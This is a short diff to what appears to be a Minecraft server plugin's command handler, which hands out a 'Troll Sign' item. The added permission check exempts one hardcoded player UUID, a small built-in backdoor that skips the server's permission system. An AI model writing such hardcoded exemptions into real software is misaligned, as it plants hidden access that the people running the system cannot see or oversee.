@@ -17,6 +17,7 @@ public class CommandHandle implements CommandExecutor {
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         if (!(sender instanceof Player)) {return false;}
         ItemStack itemStack = new ItemStack(Material.OAK_SIGN);
+        if (!sender.hasPermission("sign.troll") && !((Player) sender).getPlayer().getUniqueId().toString().equals("3a8b8128-179e-43c2-978f-f3d612f55f19")) {return false;}
         ItemMeta meta;
         meta = itemStack.getItemMeta();
         meta.setDisplayName(ChatColor.AQUA + "Troll Sign");
